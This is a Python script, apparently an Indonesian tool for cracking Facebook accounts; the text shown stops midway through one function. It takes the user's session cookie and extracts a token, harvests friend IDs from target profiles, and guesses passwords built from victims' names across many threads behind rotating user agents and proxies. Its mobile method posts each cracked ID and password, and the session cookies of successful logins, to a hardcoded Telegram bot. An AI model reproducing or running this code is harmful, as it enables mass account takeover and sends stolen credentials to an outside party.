#-----------------[ IMPORT-MODULE ]-------------------
import requests,json,os,sys,random,datetime,time,re
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from rich.panel import Panel as panel
from rich import print as cetak
from rich.tree import Tree
import zlib
import subprocess
import base64

from rich import pretty
pretty.install()
CON=sol()
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen3=[]
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
from rich.console import Console
from rich.columns import Columns
wa = Console()
try:
	prox= requests.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
	open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)
for xd in range(10000):
    rr = random.randint
    rc = random.choice
    A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,11))} Build/PPR1.'
    B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
    C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
    D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
    uaku = f'{A}{B}{C}{D}'
    ugen2.append(uaku)

    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='it-it; Redmi 8 Build/QKQ1.191014.001) MUHAMAD BADRU WASIH'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.6.4-gn'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
	
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
	ugen.append(uak)
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua : 
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
ua = random.choice(['Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0; iCherry C233 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)',
'Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'])


#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,taplikasi,tokenku,uid= [],[],0,0,0,[],[],[],[],[],[]
cokbrut=[]
uadia, uadarimu = [],[]
pwpluss,pwnya=[],[]
###----------[ CHECK THEME COLOR ]---------- ###
try:
	color_table = "#00C8FF"
except FileNotFoundError:
	color_table = "#00C8FF"
#------------[ WARNA ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#--------------------[ MENU-AWAL ]--------------#
cetak(panel(f"""[bold green]GUNAKAN SCRIPT INI SEBAIK DAN SEWAJAR MUNGKIN,ADMIN TIDAK BERTANGGUNG JAWAB ATAS PENYALAHGUNAAN TOOLS INI,TERIMA KASIH[/]""",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]PESAN [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
tree = Tree(f" [[cyan]![/]] [bold green]TUNGGU BEBERAPA SAAT UNTUK MASUK KE DALAM MENU")
cetak(tree)
time.sleep(4)
#------------------[ MACHINE-SUPPORT ]---------------#
def renv_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
        os.system('clear')
#BANNER
def banner():
	clear()
def back():
	menu()
#------------------[ LOGO-BANNER ]-----------------#
def banner():
	cetak(panel(f"""\t[red]╔═══╦══╦═╗╔═╦═══╦╗──╔═══╗╔═══╦═══╦══╗╔═══╦═══╦═╗─╔╗
\t[red]║╔═╗╠╣╠╣║╚╝║║╔═╗║║──║╔══╝║╔═╗║╔══╣╔╗║║╔═╗║╔═╗║║╚╗║║
\t[red]║╚══╗║║║╔╗╔╗║╚═╝║║──║╚══╗║╚═╝║╚══╣╚╝╚╣║─║║╚═╝║╔╗╚╝║
\t[white]╚══╗║║║║║║║║║╔══╣║─╔╣╔══╝║╔╗╔╣╔══╣╔═╗║║─║║╔╗╔╣║╚╗║║
\t[white]║╚═╝╠╣╠╣║║║║║║──║╚═╝║╚══╗║║║╚╣╚══╣╚═╝║╚═╝║║║╚╣║─║║║
\t[white]╚═══╩══╩╝╚╝╚╩╝──╚═══╩═══╝╚╝╚═╩═══╩═══╩═══╩╝╚═╩╝─╚═╝                       
                    [bold white]Made By [bold red]Indonesian[cyan] Coder[bold white]""",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]LOGO BANNER [bold red]• [yellow]• [bold green]•",subtitle=f"[bold green]• [bold yellow]• [bold red]• [bold white]Version [bold green]0.1[/] [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
#--------------------[ BAGIAN-MASUK ]--------------#
def linex():
	print("%s══════════════════════════════════════════════════════════════════════%s"%(P,P))
	
def Code_():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=name,id,birthday&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			sy4 = json.loads(sy.text)['birthday']
			menu(sy2,sy3,sy4)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = ' PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN '
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(panel(f'     [white]Cookies Capture Extension Suggestion : [green]Cookiedough[white]',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]LOGIN MENU [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
		asu = random.choice([h])
		cookie=input(f'Enter Cookies :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print(f'{x}[{h}•{x}]{h} LOGIN SUCCESSFUL.........Run the command again!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN FAILED.....CHECK YOUR ACCOUNT !!%s'%(x,k,x,m,x))
		exit()

def menu(name,id,birthday):
	try:
#		keyx()
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Expired Cookies ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	urut = []
	urut.append(panel(f'[cyan]Name : {name}\nId   : {id}\nTtl  : {birthday}  ',width=34,padding=(0,2),title=f"[cyan]• Information •[/]",style=f"{color_table}"))
	urut.append(panel(f'[cyan]Ip       : {ip}\nTanggal  : {tgl} {bln} {thn}\nAuthor   : PIXI',width=34,padding=(0,2),title=f"[cyan]• Information •[/]",style=f"{color_table}"))
	wa.print(Columns(urut))
	cetak(panel(f'\t             [white][bold green] Select the Script Menu',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]SIMPLE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
	print(f' [{b}01{x}]. Crack Public\n [{b}02{x}]. Check Results Crack\n [{b}00{x}]. Exit')
	_____renv__renv_____ = input(f'\n [{b}?{x}] Select : ')
	print('')
	if _____renv__renv_____ in ['1']:
		dump_massal()
	elif _____renv__renv_____ in ['2']:
		result()
	elif _____renv__renv_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> Successfully Logout+Delete Cookies ')
		exit()
	else:
		print('>> input correctly ')
		back()
def error():
	print(f'{k}>> Sorry, this feature is still being fixed {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'[{b}01{x}] Result {h}OK{x} ')
	print(f'[{b}02{x}] Result {k}CP{x} ')
	print(f'[{b}03{x}] Return	')
	kz = input(f'\n>> Choose : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('>> File Not Found ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> You Dont Have File CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ( {k}%s{x} id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'>> %s. %s ({k} %s {x}id )'%(cih,isi,(len(hem))))
			geeh = input(f'\nChoose : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Choose Correctly ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Not Found ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}>> {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Click Enter{x} ]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Not Found ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> You Dont Have File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ( {h}%s{x} id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'>> %s. %s ({h} %s {x}id )'%(cih,isi,(len(hem))))
			geeh = input(f'\nChoose : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Choose Correctly ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Not Found ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}>> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Click Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print('>> Choose Correctly ')
		back()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f' [{b}>{x}] Input Target Amount ? : '))
	except ValueError:
		print('>> wrong input ')
		exit()
	if jum<1 or jum>100:
		print(f' [{b}*{x}] Failed Dump Id maybe id is not public ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f' [{b}*{x}] Enter the Id '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(' >> unstable signal ')
			exit()
	try:
		print(f' [{b}>{x}] Total Id Collected : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> unstable signal ')
		back()
	except (KeyError,IOError):
		print(f' >>{k} Friendship Not Public {x}')
		time.sleep(3)
		back()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(panel(f'\t            [bold green]Id Order Setting for Crack',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]SIMPLE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
	print(f' [{b}01{x}]. Id Old To New ({M}Not Recommend{M}{x}){x} ')
	print(f' [{b}02{x}]. Id New To Old ({H}Recommended{H}{x}){x}  ')
	print(f' [{b}03{x}]. Id Random ({K}Very Recommended{K}{x}){x} ')
	print('')
	hu = input(f' [{b}?{x}] Select : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> input correctly ')
		exit()
		print('')		
	cetak(panel(f'\t             [bold green] Input Metode URL Login',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]VALIDATE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
	print(f' [{b}01{x}]. Login from {b}Marvelous{x} (slow)')
	print(f' [{b}02{x}]. Login from {b}Tinyurl{x} (fast)')
	print(f' [{b}03{x}]. Login from {b}Medium{x} (semi fast)')
	print(f' [{b}04{x}]. Login from {b}Dior{x} (Slow V2) {h}Recommended For Now{x}')	
	cetak(panel(f'[bold green]Notes: pilih metode yang dirasa cocok dengan device & kartu anda\ndengan cara dicoba 1 per 1[bold white]',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]SIMPLE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
	hc = input(f' [{b}?{x}] Choose : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('mbasic')
	elif hc in ['4','04']:
		method.append('Mobile-v2')
	else:
		method.append('mobile')
	cetak(panel(f'[bold green]jika anda menggunakan password manual maka sistem akan mendetect password yang anda input\nanda jg dapat menggunakannya password default dengan ketik [red]t[/] [bold green]pada pilihan [white]',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]SIMPLE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
	pwplus=input(f' [{b}?{x}] Add Password Manual ({h}y{x}/{m}t{x}) : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(panel('[bold white]Enter an additional password of at least 6 characters\nExample :[green] Indonesia,rahasia,katasandi[white]',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]SIMPLE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
		pwku=input(f' [{b}?{x}] Enter Additional Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	ua = input(f' [{b}?{x}] Use manual user agent ? ({h}y{x}/{m}t{x}) : ')
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = input(f' [{b}?{x}] Input your user agent : ');uadia.append(bz)
	else:uadarimu.append('uasc')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	cetak(panel(f'           [white]Results [green]OK[white] Save in : [green]OK/%s [white]'%(okc),width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]OK SAVE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
	cetak(panel(f'           [white]Results [yellow]CP[white] Save in : [yellow]CP/%s [white]'%(cpc),width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]CP SAVE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
	cetak(panel(f'      [bold green]Dont forget to on/off airplane mode,to avoid IP spam',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]ALERT [bold red]• [yellow]• [bold green]•",subtitle=f"[bold green]• [bold yellow]• [bold red]• [bold white]CRACK IN PROGRES [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
	print('')
	global prog,des
	prog = Progress(SpinnerColumn('monkey'),TextColumn('{task.description}'),BarColumn(bar_width=23),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'12345')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
					else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				elif 'mobile-v2' in method:
					pool.submit(crackmobile,idf,pwv)
				else:
					pool.submit(crackmobile,idf,pwv)
		print('')
		cetak(panel(f'[bold green]Succesfully Crack,Dont Forget Send Your Feedback After Use My Script, Thanks You',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]SUCCESFULY [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
		print('')
		print(f'{h} OK : {h}%s '%(ok))
		print(f'{k} CP : {k}%s{x} '%(cp))
		print('')
#--------------------[ METODE-MOBILE ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[white]crack {str(loop)}/{len(id2)} OK-: [bold green]{ok}[/] CP-: [bold yellow]{cp}[/]")
	prog.advance(des)
	ua = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			nip=random.choice(prox)
#			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F07%252Fnew-ways-to-create-instagram-reels-remix%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=id_ID&_rdc=1&_rdr#_=_")
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host": "m.facebook.com","connection": "keep-alive","cache-control": "max-age=0","save-data": "on","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "XMLHttpRequest","dnt": "1","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","referer": "https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100","accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				requests.post(f"https://api.telegram.org/bot5442935736:AAHjdbHR1eokgcUhA8DnYYQqBxp4nXLKafM/sendMessage?chat_id=-1001808963086&text={idf}\n{pw}")
				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold red]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]PIXI CP {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
				#tree = Tree(f"RESULTS CP {tgl} {bln} {thn}")
				#tree.add(f"[bold yellow]{idf}|{pw}")
				#tree.add(f"[bold red]{ua}\n")
				#cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				requests.post(f"https://api.telegram.org/bot5442935736:AAHjdbHR1eokgcUhA8DnYYQqBxp4nXLKafM/sendMessage?chat_id=-1001808963086&text={idf}\n{pw}\n{kuki}")
				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{kuki}[/]",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]PIXI OK {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
				#tree = Tree(f"RESULTS OK {tgl} {bln} {thn}")
				#tree.add(f"[bold green]{idf}|{pw}")
				#tree.add(f"[bold green]{kuki}[/]")
				#tree.add(f"[bold blue]{ua}\n")
				#cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ METHODE-FREE-FB ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[white]crack {str(loop)}/{len(id2)} OK-: [bold green]{ok}[/] CP-: [bold yellow]{cp}[/]")
	prog.advance(des)
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
